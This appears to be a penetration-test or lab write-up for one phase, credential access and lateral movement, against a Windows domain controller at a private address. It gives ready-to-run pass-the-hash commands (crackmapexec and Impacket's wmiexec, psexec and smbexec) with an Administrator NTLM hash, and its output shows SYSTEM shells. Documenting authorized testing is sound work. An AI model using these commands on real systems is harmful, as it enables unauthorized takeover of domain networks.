# Phase 5: Credential Access & Lateral Movement

MITRE ATT\&CK Techniques:

* T1003.006: OS Credential Dumping - LSASS Memory
* T1021.002: Remote Services - SMB/Windows Admin Shares
* T1021.003: Remote Services - WinRM
* T1077: Windows Admin Shares

## Objective:

The objective of this phase was to:

* Utilize the extracted Administrator NTLM hash obtained in Phase 4.
* Confirm access using the hash to authenticate.
* Execute remote code on the Domain Controller (192.168.50.5) using various Impacket tools.
* Achieve NT AUTHORITY\SYSTEM level access.
* Demonstrate lateral movement using credentials.

## Step 1: Validate Access with crackmapexec

Command:

```
crackmapexec smb 192.168.50.5 -u Administrator -H 68ae965c9062b389f2a285e27ff0a566 -d CORP
```

Output:

```
[+] CORP\Administrator:68ae965c9062b389f2a285e27ff0a566 (Pwn3d!)
```

Confirmed that the hash is valid and grants Administrator access to the Domain Controller.

## Step 2: Remote Shell via wmiexec.py

Command:

```
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py CORP/Administrator@192.168.50.5 -hashes aad3b435b51404eeaad3b435b51404ee:68ae965c9062b389f2a285e27ff0a566
```

Result:

```
C:\> whoami
nt authority\system
```

Achieved SYSTEM-level shell through WMI execution.

## Step 3: SYSTEM Access via psexec.py

Command:

```
python3 /usr/share/doc/python3-impacket/examples/psexec.py CORP/Administrator@192.168.50.5 -hashes aad3b435b51404eeaad3b435b51404ee:68ae965c9062b389f2a285e27ff0a566
```

Result:

```
C:\Windows\system32> whoami
nt authority\system
```

Remote service installed and executed successfully, providing SYSTEM shell.

## Step 4: Remote Execution via smbexec.py

Command:

```
python3 /usr/share/doc/python3-impacket/examples/smbexec.py CORP/Administrator@192.168.50.5 -hashes aad3b435b51404eeaad3b435b51404ee:68ae965c9062b389f2a285e27ff0a566
```

Result:

```
C:\Windows\system32> whoami
nt authority\system
```

Obtained another SYSTEM-level interactive shell using SMBExec.

## Conclusion:

All three remote execution techniques were tested successfully using the Administrator NTLM hash. The access level achieved was NT AUTHORITY\SYSTEM. This phase validated the ability to move laterally and execute commands remotely on a domain-joined system with full privileges.

Screenshots for all steps including hash dumps and command outputs have been captured and saved for documentation.
